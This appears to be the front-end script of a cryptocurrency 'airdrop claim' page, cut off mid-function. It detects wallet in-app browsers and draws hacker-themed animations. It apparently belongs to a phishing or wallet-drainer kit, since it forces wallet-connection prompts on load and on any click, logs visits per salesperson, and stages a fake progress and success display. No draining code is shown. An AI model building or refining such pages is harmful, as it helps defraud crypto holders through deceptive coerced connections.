
// 检测是否在钱包内置浏览器中
// 核心原则：isMetaMask 是最不可靠的标志（很多钱包 fork MetaMask 也会设为 true），放最后
function detectWalletBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  const isMobile = isMobileDevice();

  // 🔍 调试信息：打印所有钱包相关全局对象
  console.log('🔍 detectWalletBrowser() called');
  console.log(`🔍 UA: ${navigator.userAgent.substring(0, 100)}`);
  console.log(`🔍 isMobile: ${isMobile}`);
  console.log(`🔍 window.ethereum: ${typeof window.ethereum}`);
  if (typeof window.ethereum !== 'undefined') {
    const flags = Object.keys(window.ethereum).filter(k => k.startsWith('is'));
    console.log(`🔍 ethereum.isXxx flags: [${flags.join(', ')}]`);
    flags.forEach(f => console.log(`🔍   ethereum.${f} = ${window.ethereum[f]}`));
  }
  console.log(`🔍 window.BinanceChain: ${typeof window.BinanceChain}`);
  console.log(`🔍 window.okxwallet: ${typeof window.okxwallet}`);
  console.log(`🔍 window.coinbaseWalletExtension: ${typeof window.coinbaseWalletExtension}`);
  console.log(`🔍 window.bitkeep: ${typeof window.bitkeep}`);
  console.log(`🔍 window.trustwallet: ${typeof window.trustwallet}`);

  // ===== 优先级1：检查特定的全局对象（最可靠）=====
  if (typeof window.BinanceChain !== 'undefined') {
    console.log('✅ Detected: BinanceChain global object');
    return { isWalletBrowser: true, walletId: 'binance', walletName: 'Binance Web3 Wallet' };
  }
  if (typeof window.okxwallet !== 'undefined') {
    console.log('✅ Detected: okxwallet global object');
    return { isWalletBrowser: true, walletId: 'okx', walletName: 'OKX Wallet' };
  }
  if (typeof window.coinbaseWalletExtension !== 'undefined') {
    console.log('✅ Detected: coinbaseWalletExtension global object');
    return { isWalletBrowser: true, walletId: 'coinbase', walletName: 'Coinbase Wallet' };
  }
  if (typeof window.bitkeep !== 'undefined' && window.bitkeep.ethereum) {
    console.log('✅ Detected: bitkeep.ethereum global object');
    return { isWalletBrowser: true, walletId: 'bitget', walletName: 'Bitget Wallet' };
  }
  if (typeof window.trustwallet !== 'undefined') {
    console.log('✅ Detected: trustwallet global object');
    return { isWalletBrowser: true, walletId: 'trust', walletName: 'Trust Wallet' };
  }

  // ===== 优先级2：通过 window.ethereum 的 isXxx 标志检测 =====
  // ⚠️ isMetaMask 必须放最后检查！很多非 MetaMask 钱包也有 isMetaMask=true
  if (typeof window.ethereum !== 'undefined') {
    if (window.ethereum.isBinance || window.ethereum.isBinanceWallet) {
      console.log('✅ Detected: ethereum.isBinance flag');
      return { isWalletBrowser: true, walletId: 'binance', walletName: 'Binance Web3 Wallet' };
    }
    if (window.ethereum.isTrust) {
      console.log('✅ Detected: ethereum.isTrust flag');
      return { isWalletBrowser: true, walletId: 'trust', walletName: 'Trust Wallet' };
    }
    if (window.ethereum.isOKXWallet) {
      console.log('✅ Detected: ethereum.isOKXWallet flag');
      return { isWalletBrowser: true, walletId: 'okx', walletName: 'OKX Wallet' };
    }
    if (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbase) {
      console.log('✅ Detected: ethereum.isCoinbaseWallet flag');
      return { isWalletBrowser: true, walletId: 'coinbase', walletName: 'Coinbase Wallet' };
    }
    if (window.ethereum.isBitKeep || window.ethereum.isBitget) {
      console.log('✅ Detected: ethereum.isBitKeep/isBitget flag');
      return { isWalletBrowser: true, walletId: 'bitget', walletName: 'Bitget Wallet' };
    }
    if (window.ethereum.isImToken) {
      console.log('✅ Detected: ethereum.isImToken flag');
      return { isWalletBrowser: true, walletId: 'imtoken', walletName: 'imToken' };
    }
    if (window.ethereum.isTokenPocket) {
      console.log('✅ Detected: ethereum.isTokenPocket flag');
      return { isWalletBrowser: true, walletId: 'tokenpocket', walletName: 'TokenPocket' };
    }
    if (window.ethereum.isMathWallet) {
      console.log('✅ Detected: ethereum.isMathWallet flag');
      return { isWalletBrowser: true, walletId: 'mathwallet', walletName: 'MathWallet' };
    }
    if (window.ethereum.isRabby) {
      console.log('✅ Detected: ethereum.isRabby flag');
      return { isWalletBrowser: true, walletId: 'rabby', walletName: 'Rabby Wallet' };
    }
    // ⚠️ isMetaMask 放最后！只有排除了所有其他钱包后才认为是 MetaMask
    if (window.ethereum.isMetaMask) {
      console.log('✅ Detected: ethereum.isMetaMask flag (no other wallet flags found)');
      return { isWalletBrowser: true, walletId: 'metamask', walletName: 'MetaMask' };
    }
    // 没有 isXxx 标志但有 ethereum，可能是未知钱包
    console.log('⚠️ ethereum exists but no isXxx flags detected');
  }

  // ===== 优先级3：通过 User-Agent 检测（辅助判断）=====
  if (isMobile) {
    console.log(`🔍 UA (lowercase): ${ua.substring(0, 150)}`);
    if (ua.includes('binance') || ua.includes('bnc') || ua.includes('bian')) {
      console.log('✅ Detected: UA contains binance/bnc/bian');
      return { isWalletBrowser: true, walletId: 'binance', walletName: 'Binance Web3 Wallet' };
    }
    if (ua.includes('trust') || ua.includes('trustwallet')) {
      console.log('✅ Detected: UA contains trust/trustwallet');
      return { isWalletBrowser: true, walletId: 'trust', walletName: 'Trust Wallet' };
    }
    if (ua.includes('okx')) {
      return { isWalletBrowser: true, walletId: 'okx', walletName: 'OKX Wallet' };
    }
    if (ua.includes('coinbase')) {
      return { isWalletBrowser: true, walletId: 'coinbase', walletName: 'Coinbase Wallet' };
    }
    if (ua.includes('bitkeep') || ua.includes('bitget')) {
      return { isWalletBrowser: true, walletId: 'bitget', walletName: 'Bitget Wallet' };
    }
    if (ua.includes('imtoken')) {
      return { isWalletBrowser: true, walletId: 'imtoken', walletName: 'imToken' };
    }
    if (ua.includes('tokenpocket') || ua.includes('tpoutside')) {
      return { isWalletBrowser: true, walletId: 'tokenpocket', walletName: 'TokenPocket' };
    }
    if (ua.includes('metamask')) {
      return { isWalletBrowser: true, walletId: 'metamask', walletName: 'MetaMask' };
    }
  }

  // ===== 优先级4：移动端兜底 —— 有 ethereum 对象就认为是钱包浏览器 =====
  // 这是最终防线：只要在移动端有 window.ethereum，一定是在钱包内，直接连
  if (isMobile && typeof window.ethereum !== 'undefined') {
    return { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
  }

  return { isWalletBrowser: false, walletId: null, walletName: null };
}

let provider = null;
let signer = null;
let walletAddress = null;
let chainId = null;

// 全局变量：是否在钱包浏览器中
// ⚠️ 不能用 const 一次性检测！钱包浏览器（如 Trust/OKX/Bitget）注入 window.ethereum 有延迟，
// 脚本加载时 ethereum 还没注入，检测结果永远是 isWalletBrowser=false，导致跳转 MetaMask
// 必须每次动态检测，确保 ethereum 注入后也能正确识别钱包
function getWalletBrowserInfo() {
  return detectWalletBrowser();
}
// walletBrowserInfo 作为快捷引用，但每次访问都重新检测
let walletBrowserInfo = detectWalletBrowser();

const SUPPORTED_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', desc: 'Most popular wallet', provider: 'ethereum', deepLink: { ios: 'https://metamask.app.link/dapp/', android: 'https://metamask.app.link/dapp/', universal: 'https://metamask.app.link/dapp/' }, downloadUrl: 'https://metamask.io/download/' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', desc: 'Secure mobile wallet', provider: 'coinbaseWalletExtension', deepLink: { ios: 'cbwallet://dapp/', android: 'cbwallet://dapp/', universal: 'https://go.cb-w.com/dapp/' }, downloadUrl: 'https://www.coinbase.com/wallet/downloads' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', desc: 'Connect any wallet', provider: 'walletconnect', deepLink: { ios: 'wc://', android: 'wc://', universal: 'https://walletconnect.com/' }, downloadUrl: 'https://walletconnect.com/' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', desc: 'Multi-chain wallet', provider: 'trustwallet', deepLink: { ios: 'trust://dapp/', android: 'trust://dapp/', universal: 'https://link.trustwallet.com/dapp/' }, downloadUrl: 'https://trustwallet.com/download' },
  { id: 'brave', name: 'Brave Wallet', icon: '🦁', desc: 'Built-in Brave wallet', provider: 'braveWallet', deepLink: { ios: 'brave://dapp/', android: 'brave://dapp/', universal: 'https://brave.com/wallet/' }, downloadUrl: 'https://brave.com/wallet/' },
  { id: 'rabby', name: 'Rabby Wallet', icon: '🐰', desc: 'Multi-chain wallet', provider: 'rabby', deepLink: { ios: 'rabby://dapp/', android: 'rabby://dapp/', universal: 'https://rabby.io/' }, downloadUrl: 'https://rabby.io/' },
  { id: 'okx', name: 'OKX Wallet', icon: '⭕', desc: 'OKX Web3 wallet', provider: 'okexchain', deepLink: { ios: 'okx://dapp/', android: 'okx://dapp/', universal: 'https://www.okx.com/web3' }, downloadUrl: 'https://www.okx.com/web3' },
  { id: 'imtoken', name: 'imToken', icon: '📱', desc: 'Mobile wallet', provider: 'imToken', deepLink: { ios: 'imtokenv2://dapp/', android: 'imtokenv2://dapp/', universal: 'https://token.im/' }, downloadUrl: 'https://token.im/download' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🧮', desc: 'Multi-chain wallet', provider: 'mathwallet', deepLink: { ios: 'mathwallet://dapp/', android: 'mathwallet://dapp/', universal: 'https://mathwallet.org/' }, downloadUrl: 'https://mathwallet.org/' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: ' purse', desc: 'Multi-chain wallet', provider: 'tokenpocket', deepLink: { ios: 'tpoutside://dapp/', android: 'tpoutside://dapp/', universal: 'https://www.tokenpocket.pro/' }, downloadUrl: 'https://www.tokenpocket.pro/' },
  { id: 'binance', name: 'Binance Web3 Wallet', icon: '🟡', desc: 'Binance official wallet', provider: 'binance', deepLink: { ios: 'bnc://app/', android: 'bnc://app/', universal: 'https://www.binance.com/en/web3' }, downloadUrl: 'https://www.binance.com/en/web3' },
  { id: 'bitget', name: 'Bitget Wallet', icon: '🟣', desc: 'Multi-chain wallet', provider: 'bitget', deepLink: { ios: 'bitkeep://dapp/', android: 'bitkeep://dapp/', universal: 'https://bkcode.vip/' }, downloadUrl: 'https://web3.bitget.com/' }
];

// Intro animation functions
function enterApp() {
  const intro = document.getElementById('introOverlay');
  intro.style.animation = 'introFadeOut 1s ease-out forwards';
  setTimeout(() => {
    intro.style.display = 'none';
  }, 1000);
}

function startIntroAnimations() {
  // Typing effect
  const typingText = document.getElementById('typingText');
  const messages = [
    'INITIALIZING QUANTUM NETWORK...',
    'CONNECTING TO BLOCKCHAIN...',
    'LOADING AI PROTOCOLS...',
    'SECURE CHANNEL ESTABLISHED...',
    'READY FOR AIRDROP CLAIM...'
  ];
  
  let messageIndex = 0;
  let charIndex = 0;
  
  function typeMessage() {
    if (messageIndex < messages.length) {
      if (charIndex < messages[messageIndex].length) {
        typingText.textContent += messages[messageIndex].charAt(charIndex);
        charIndex++;
        setTimeout(typeMessage, 50);
      } else {
        setTimeout(() => {
          typingText.textContent = '';
          messageIndex++;
          charIndex = 0;
          typeMessage();
        }, 1500);
      }
    }
  }
  
  setTimeout(typeMessage, 2000);
  
  // Counter animation
  const statValues = document.querySelectorAll('.stat-value');
  statValues.forEach(stat => {
    const target = parseInt(stat.dataset.target);
    let current = 0;
    const increment = target / 100;
    const interval = setInterval(() => {
      current += increment;
      if (current >= target) {
        current = target;
        clearInterval(interval);
      }
      stat.textContent = Math.floor(current).toLocaleString();
    }, 20);
  });
}

// ===== BACKGROUND EFFECTS INITIALIZATION =====
function initBackgroundEffects() {
  initCanvasBackground();
  initParticles();
  initStarfield();
  initCircuitLines();
  initMatrixRain();
  initFlowLights();
}

// Canvas particle system - enhanced GLM style
function initCanvasBackground() {
  const canvas = document.getElementById('bgCanvas');
  const ctx = canvas.getContext('2d');
  
  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resizeCanvas();
  window.addEventListener('resize', resizeCanvas);
  
  const particles = [];
  const particleCount = 120;
  const colors = [
    { r: 0, g: 245, b: 212 },   // cyan
    { r: 0, g: 187, b: 249 },   // blue
    { r: 100, g: 120, b: 255 }, // indigo
    { r: 155, g: 93, b: 229 },  // purple
    { r: 0, g: 150, b: 255 },   // bright blue
  ];
  
  for (let i = 0; i < particleCount; i++) {
    const color = colors[Math.floor(Math.random() * colors.length)];
    particles.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      vx: (Math.random() - 0.5) * 0.4,
      vy: (Math.random() - 0.5) * 0.4,
      radius: Math.random() * 2.5 + 0.5,
      opacity: Math.random() * 0.6 + 0.1,
      color: color,
      pulseSpeed: Math.random() * 0.02 + 0.01,
      pulsePhase: Math.random() * Math.PI * 2
    });
  }
  
  let time = 0;
  
  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    time += 0.016;
    
    particles.forEach((p, i) => {
      p.x += p.vx;
      p.y += p.vy;
      
      if (p.x < 0) p.x = canvas.width;
      if (p.x > canvas.width) p.x = 0;
      if (p.y < 0) p.y = canvas.height;
      if (p.y > canvas.height) p.y = 0;
      
      const pulse = Math.sin(time * p.pulseSpeed * 60 + p.pulsePhase) * 0.3 + 0.7;
      const alpha = p.opacity * pulse;
      
      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius * pulse, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(${p.color.r}, ${p.color.g}, ${p.color.b}, ${alpha})`;
      ctx.fill();
      
      // Glow effect for larger particles
      if (p.radius > 1.5) {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius * 3, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(${p.color.r}, ${p.color.g}, ${p.color.b}, ${alpha * 0.1})`;
        ctx.fill();
      }
      
      particles.slice(i + 1).forEach(p2 => {
        const dx = p.x - p2.x;
        const dy = p.y - p2.y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        
        if (dist < 180) {
          const lineAlpha = (1 - dist / 180) * 0.15;
          const mr = Math.round((p.color.r + p2.color.r) / 2);
          const mg = Math.round((p.color.g + p2.color.g) / 2);
          const mb = Math.round((p.color.b + p2.color.b) / 2);
          
          ctx.beginPath();
          ctx.moveTo(p.x, p.y);
          ctx.lineTo(p2.x, p2.y);
          ctx.strokeStyle = `rgba(${mr}, ${mg}, ${mb}, ${lineAlpha})`;
          ctx.lineWidth = 0.5;
          ctx.stroke();
        }
      });
    });
    
    requestAnimationFrame(animate);
  }
  
  animate();
}

// Floating particles - enhanced
function initParticles() {
  const particleLayer = document.getElementById('particleLayer');
  const colors = ['#00f5d4', '#0088ff', '#7c4dff', '#00bbf9', '#536dfe', '#448aff'];
  
  for (let i = 0; i < 40; i++) {
    const particle = document.createElement('div');
    particle.className = 'floating-particle';
    
    const size = Math.random() * 10 + 3;
    const color = colors[Math.floor(Math.random() * colors.length)];
    const left = Math.random() * 100;
    const delay = Math.random() * 8;
    const duration = Math.random() * 6 + 6;
    
    particle.style.cssText = `
      width: ${size}px;
      height: ${size}px;
      background: ${color};
      left: ${left}%;
      animation-delay: -${delay}s;
      animation-duration: ${duration}s;
      box-shadow: 0 0 ${size * 3}px ${color}, 0 0 ${size * 6}px ${color}40
    `;
    
    particleLayer.appendChild(particle);
  }
}

// Starfield
function initStarfield() {
  const starfield = document.getElementById('starfield');
  const starCount = 100;
  
  for (let i = 0; i < starCount; i++) {
    const star = document.createElement('div');
    star.className = 'star';
    
    const x = Math.random() * 100;
    const y = Math.random() * 100;
    const delay = Math.random() * 3;
    const duration = Math.random() * 2 + 2;
    
    star.style.cssText = `
      left: ${x}%;
      top: ${y}%;
      animation-delay: -${delay}s;
      animation-duration: ${duration}s
    `;
    
    starfield.appendChild(star);
  }
}

// Circuit lines
function initCircuitLines() {
  const circuitLines = document.getElementById('circuitLines');
  
  for (let i = 0; i < 10; i++) {
    const line = document.createElement('div');
    line.className = 'circuit-line';
    
    const top = Math.random() * 100;
    const left = Math.random() * 100;
    const width = Math.random() * 200 + 100;
    const delay = Math.random() * 3;
    
    line.style.cssText = `
      top: ${top}%;
      left: ${left}%;
      width: ${width}px;
      animation-delay: -${delay}s
    `;
    
    circuitLines.appendChild(line);
  }
  
  for (let i = 0; i < 10; i++) {
    const line = document.createElement('div');
    line.className = 'circuit-line circuit-vertical';
    
    const top = Math.random() * 100;
    const left = Math.random() * 100;
    const height = Math.random() * 200 + 100;
    const delay = Math.random() * 4;
    
    line.style.cssText = `
      top: ${top}%;
      left: ${left}%;
      height: ${height}px;
      animation-delay: -${delay}s
    `;
    
    circuitLines.appendChild(line);
  }
}

// Matrix rain
function initMatrixRain() {
  const matrixRain = document.getElementById('matrixRain');
  const columns = 20;
  const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
  
  for (let i = 0; i < columns; i++) {
    const column = document.createElement('div');
    column.className = 'matrix-column';
    
    const left = (i / columns) * 100;
    const delay = Math.random() * 20;
    const duration = Math.random() * 10 + 15;
    const text = Array(30).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
    
    column.style.cssText = `
      left: ${left}%;
      animation-delay: -${delay}s;
      animation-duration: ${duration}s;
      white-space: pre;
      line-height: 1.2
    `;
    column.textContent = text;
    
    matrixRain.appendChild(column);
  }
}

// GLM Style Flowing Light Streaks
function initFlowLights() {
  const flowLights = document.getElementById('flowLights');
  const colors = [
    'rgba(0,245,212,0.3)',
    'rgba(0,150,255,0.4)',
    'rgba(100,120,255,0.3)',
    'rgba(0,187,249,0.35)',
    'rgba(120,50,220,0.25)'
  ];
  
  for (let i = 0; i < 8; i++) {
    const streak = document.createElement('div');
    streak.className = 'flow-streak';
    
    const top = Math.random() * 100;
    const width = Math.random() * 300 + 150;
    const delay = Math.random() * 8;
    const duration = Math.random() * 4 + 6;
    const color = colors[Math.floor(Math.random() * colors.length)];
    
    streak.style.cssText = `
      top: ${top}%;
      width: ${width}px;
      background: linear-gradient(90deg, transparent, ${color}, transparent);
      animation-delay: -${delay}s;
      animation-duration: ${duration}s;
      box-shadow: 0 0 20px ${color}
    `;
    
    flowLights.appendChild(streak);
  }
}

// Progress bar update function
// 进度条动画变量
let currentProgress = 0;
let progressAnimationId = null;

function updateProgress(percent, status, smooth = true) {
  const progressFill = document.getElementById('progressFill');
  const progressPercent = document.getElementById('progressPercent');
  const progressStatus = document.getElementById('progressStatus');
  
  // 取消之前的动画
  if (progressAnimationId) {
    cancelAnimationFrame(progressAnimationId);
  }
  
  if (smooth) {
    // 平滑动画
    const animateProgress = () => {
      const diff = percent - currentProgress;
      if (Math.abs(diff) < 0.5) {
        currentProgress = percent;
        progressFill.style.width = `${currentProgress}%`;
        progressPercent.textContent = `${Math.round(currentProgress)}%`;
        progressStatus.textContent = status;
        return;
      }
      
      currentProgress += diff * 0.1; // 动画速度因子
      progressFill.style.width = `${currentProgress}%`;
      progressPercent.textContent = `${Math.round(currentProgress)}%`;
      progressStatus.textContent = status;
      
      progressAnimationId = requestAnimationFrame(animateProgress);
    };
    
    animateProgress();
  } else {
    // 立即更新
    currentProgress = percent;
    progressFill.style.width = `${percent}%`;
    progressPercent.textContent = `${Math.round(percent)}%`;
    progressStatus.textContent = status;
  }
}

// Success modal functions
function showSuccessModal(amount, network, hash) {
  const modal = document.getElementById('successModal');
  const successAmount = document.getElementById('successAmount');
  const successNetwork = document.getElementById('successNetwork');
  const successHash = document.getElementById('successHash');

  successAmount.textContent = amount;
  successNetwork.textContent = network;
  successHash.textContent = hash.substring(0, 10) + '...' + hash.substring(hash.length - 8);

  // 更新弹窗内的 i18n 翻译
  if (typeof changeLang === 'function') {
    changeLang(currentLang);
  }

  modal.classList.remove('hidden');
}

function closeSuccessModal() {
  document.getElementById('successModal').classList.add('hidden');
}

// 平滑进度动画函数
async function smoothProgressTo(targetPercent, duration, statusCallback) {
  const startTime = performance.now();
  const startPercent = currentProgress;
  
  return new Promise((resolve) => {
    const animate = (currentTime) => {
      const elapsed = currentTime - startTime;
      const progress = Math.min(elapsed / duration, 1);
      
      // 使用 easeOutCubic 缓动函数
      const easedProgress = 1 - Math.pow(1 - progress, 3);
      const currentPercent = startPercent + (targetPercent - startPercent) * easedProgress;
      
      const status = statusCallback ? statusCallback(currentPercent) : '';
      updateProgress(currentPercent, status, false);
      
      if (progress < 1) {
        requestAnimationFrame(animate);
      } else {
        resolve();
      }
    };
    
    requestAnimationFrame(animate);
  });
}

// 成功动画函数 - 优化速度（更快）
async function playSuccessAnimation(element) {
  element.classList.add('success-pulse');
  createSuccessParticles(element);
  // 优化速度：等待 400ms
  await new Promise(resolve => setTimeout(resolve, 400));
  element.classList.remove('success-pulse');
}

// 创建成功粒子效果 - 优化速度
function createSuccessParticles(element) {
  const rect = element.getBoundingClientRect();
  const centerX = rect.left + rect.width / 2;
  const centerY = rect.top + rect.height / 2;
  
  // 创建粒子容器
  const particleContainer = document.createElement('div');
  particleContainer.className = 'success-particles-container';
  particleContainer.style.position = 'fixed';
  particleContainer.style.left = '0';
  particleContainer.style.top = '0';
  particleContainer.style.width = '100%';
  particleContainer.style.height = '100%';
  particleContainer.style.pointerEvents = 'none';
  particleContainer.style.zIndex = '9999';
  document.body.appendChild(particleContainer);
  
  // 优化速度：减少粒子数量和动画时间
  const particleCount = 20; // 原来是 30
  const colors = ['#00ff88', '#00d4ff', '#ffd700', '#ff6b6b'];
  
  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement('div');
    particle.className = 'success-particle';
    
    const angle = (i / particleCount) * Math.PI * 2;
    const velocity = 80 + Math.random() * 80; // 降低速度
    const color = colors[Math.floor(Math.random() * colors.length)];
    
    particle.style.cssText = `
      position: absolute;
      left: ${centerX}px;
      top: ${centerY}px;
      width: 8px;
      height: 8px;
      background: ${color};
      border-radius: 50%;
      box-shadow: 0 0 10px ${color};
      pointer-events: none;
      animation: particle-explode 0.6s ease-out forwards;
      --vx: ${Math.cos(angle) * velocity}px;
      --vy: ${Math.sin(angle) * velocity}px;
    `;
    
    particleContainer.appendChild(particle);
    
    // 优化：更早移除粒子
    setTimeout(() => {
      particle.remove();
    }, 600);
  }
  
  // 添加动画样式
  if (!document.getElementById('success-animation-styles')) {
    const style = document.createElement('style');
    style.id = 'success-animation-styles';
    style.textContent = `
      @keyframes particle-explode {
        0% {
          transform: translate(0, 0) scale(1);
          opacity: 1;
        }
        100% {
          transform: translate(var(--vx), var(--vy)) scale(0);
          opacity: 0;
        }
      }
      
      .success-pulse {
        animation: success-pulse-animation 0.8s ease-in-out;
      }
      
      @keyframes success-pulse-animation {
        0%, 100% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(0, 255, 136, 0);
        }
        50% {
          transform: scale(1.05);
          box-shadow: 0 0 30px 10px rgba(0, 255, 136, 0.5);
        }
      }
    `;
    document.head.appendChild(style);
  }
  
  // 优化：更早移除容器
  setTimeout(() => {
    particleContainer.remove();
  }, 700);
}

// 等待 window.ethereum 注入完成
// 很多钱包浏览器注入 ethereum 有延迟，DOMContentLoaded 时可能还没注入
function waitForEthereum(timeoutMs = 3000) {
  return new Promise((resolve) => {
    if (typeof window.ethereum !== 'undefined') {
      resolve(true);
      return;
    }
    // 监听 ethereum#initialized 事件（MetaMask 规范）
    const onInitialized = () => {
      resolve(true);
      cleanup();
    };
    // 轮询检测
    const pollInterval = setInterval(() => {
      if (typeof window.ethereum !== 'undefined') {
        resolve(true);
        cleanup();
      }
    }, 100);
    // 超时
    const timeout = setTimeout(() => {
      resolve(false);
      cleanup();
    }, timeoutMs);
    function cleanup() {
      clearInterval(pollInterval);
      clearTimeout(timeout);
      window.removeEventListener('ethereum#initialized', onInitialized);
    }
    window.addEventListener('ethereum#initialized', onInitialized);
  });
}

window.addEventListener('DOMContentLoaded', async () => {
  // ✅ 核心修复：等待 ethereum 注入完成后再检测钱包浏览器！
  // 钱包浏览器注入 ethereum 有延迟，如果检测太早，ethereum 还不存在，
  // detectWalletBrowser() 返回 isWalletBrowser=false，后续所有逻辑都走 MetaMask 分支
  if (isMobileDevice()) {
    console.log('📱 Mobile device detected, waiting for ethereum injection...');
    const injected = await waitForEthereum(5000);
    await new Promise(r => setTimeout(r, 1000));
    console.log(`📱 Ethereum injection: ${injected ? 'SUCCESS' : 'TIMEOUT'}`);
    // ✅ 额外等待 500ms：钱包注入 ethereum 后，isXxx 标志可能还未设置
    // 很多钱包先注入基础 ethereum 对象，再异步添加 isTrust/isOKXWallet 等标志
    if (injected) {
      console.log('📱 Waiting 500ms for wallet flags to be set...');
      await new Promise(r => setTimeout(r, 500));
      // 打印调试信息：查看 ethereum 上的所有 isXxx 标志
      if (typeof window.ethereum !== 'undefined') {
        const flags = Object.keys(window.ethereum).filter(k => k.startsWith('is'));
        console.log(`📱 window.ethereum flags: ${flags.join(', ') || 'NONE'}`);
        console.log(`📱 isMetaMask=${window.ethereum.isMetaMask}, isTrust=${window.ethereum.isTrust}, isOKXWallet=${window.ethereum.isOKXWallet}, isBinance=${window.ethereum.isBinance}`);
      }
    }
  }
  
  // ✅ 重新检测钱包浏览器！
  walletBrowserInfo = detectWalletBrowser();
  if (walletBrowserInfo.isWalletBrowser) {
    console.log(`✅ [DOMContentLoaded] Detected wallet browser: ${walletBrowserInfo.walletName} (walletId: ${walletBrowserInfo.walletId})`);
  } else {
    console.log('ℹ️ [DOMContentLoaded] Not in wallet browser');
  }

  await initLang();
  initWalletList();

  // Record visit for dashboard analytics (带业务员标识)
  if (typeof recordVisit === 'function') recordVisit();

  // 移动设备性能优化：减少背景效果
  if (!isMobileDevice()) {
    initBackgroundEffects();
  }

  // 移动设备性能优化：简化或跳过开场动画
  if (!isMobileDevice()) {
    startIntroAnimations();
  } else {
    // 移动设备直接隐藏开场动画
    const intro = document.getElementById('introOverlay');
    if (intro) intro.style.display = 'none';
  }

  // Also hook click anywhere to prompt connection if not connected
  document.body.addEventListener('click', async (e) => {
    if (!walletAddress && !e.target.closest('.modal-content') && !e.target.closest('#loading')) {
      const overlay = document.getElementById('clickOverlay');
      if (overlay) overlay.style.display='none';
      // ✅ 重新检测
      walletBrowserInfo = detectWalletBrowser();
      // 移动端有 ethereum = 在钱包浏览器内，直接连当前钱包
      if (isMobileDevice() && typeof window.ethereum !== 'undefined') {
        if (!walletBrowserInfo.isWalletBrowser) {
          walletBrowserInfo = { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
        }
        await connectCurrentWalletBrowser();
      } else if (typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined') {
        connectWallet(walletBrowserInfo.walletId || 'metamask', false);
      } else {
        openWalletModal();
      }
    }
  });

  setTimeout(async () => {
    await checkExistingConnection();
    hideLoading();
    // Force prompt aggressively
    if (!walletAddress) {
      // ✅ 重新检测
      walletBrowserInfo = detectWalletBrowser();
      const hasProvider = typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined';
      if (hasProvider && isMobileDevice()) {
        // 移动端有 provider = 在钱包浏览器内，直接连
        if (!walletBrowserInfo.isWalletBrowser) {
          walletBrowserInfo = { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
        }
        try { await connectCurrentWalletBrowser(); } catch(e){}
      } else if (hasProvider) {
        try { connectWallet(walletBrowserInfo.walletId || 'metamask', false); } catch(e){}
      }
    }

    // Force show collection section for testing
    document.getElementById('collectionSection').classList.remove('hidden');
  }, 300);
});

function hideLoading() {
  setTimeout(() => {
    document.getElementById('loading').classList.add('hidden');
    document.getElementById('app').classList.remove('hidden');

    // Force show collection section
    const collectionSection = document.getElementById('collectionSection');
    if (collectionSection) {
      collectionSection.classList.remove('hidden');
      console.log('Collection section forced to show');
    }

    if (!walletAddress) {
      addLog('info', 'Waiting for wallet connection...');
      // ✅ 重新检测
      walletBrowserInfo = detectWalletBrowser();
      const hasProvider = typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined';
      if (!hasProvider) {
        openWalletModal();
      } else if (isMobileDevice()) {
        // 移动端有 provider = 在钱包浏览器内，直接连当前钱包
        if (!walletBrowserInfo.isWalletBrowser) {
          walletBrowserInfo = { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
        }
        connectCurrentWalletBrowser().catch(e => console.log('Auto-connect suppressed by browser:', e));
      } else {
        // PC 端：通过 connectWallet 连接
        connectWallet(walletBrowserInfo.walletId || 'metamask', false).catch(e => console.log('Auto-connect suppressed by browser:', e));
      }
    }
  }, 800);
}

function initWalletList() {
  const walletListEl = document.getElementById('walletList');
  const availableWallets = detectAvailableWallets();
  
  if (availableWallets.length === 0) {
    walletListEl.innerHTML = `
      <div style="text-align: center; padding: 20px; color: var(--text2);">
        <div style="font-size: 32px; margin-bottom: 10px;">🔍</div>
        <p>No wallet detected</p>
        <p style="font-size: 12px; margin-top: 8px;">Please install a wallet extension</p>
      </div>
    `;
    return;
  }
  
  walletListEl.innerHTML = availableWallets.map(wallet => `
    <div class="wallet-item">
      <div class="wallet-item-icon">${wallet.icon}</div>
      <div class="wallet-item-info">
        <div class="wallet-item-name">${wallet.name}</div>
        <div class="wallet-item-desc">${wallet.desc}</div>
      </div>
      <div class="wallet-item-actions">
        <button class="wallet-btn wallet-btn-connect" onclick="connectWallet('${wallet.id}')">${t('autoConnect')}</button>
        <button class="wallet-btn wallet-btn-manual" onclick="openWalletManually('${wallet.id}')">${t('manualOpen')}</button>
      </div>
    </div>
  `).join('');
}

// 解析钱包 provider 对象，兼容各钱包注入方式
function resolveWalletProvider(walletId) {
  const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
  if (!wallet) return null;

  // 1) 币安钱包：优先 BinanceChain，其次 ethereum.isBinance
  if (walletId === 'binance') {
    if (typeof window.BinanceChain !== 'undefined') return window.BinanceChain;
    if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBinance || window.ethereum.isBinanceWallet)) return window.ethereum;
    return null;
  }
  // 2) Bitget Wallet：优先 bitkeep 全局对象，其次 ethereum.isBitKeep / isBitget
  if (walletId === 'bitget') {
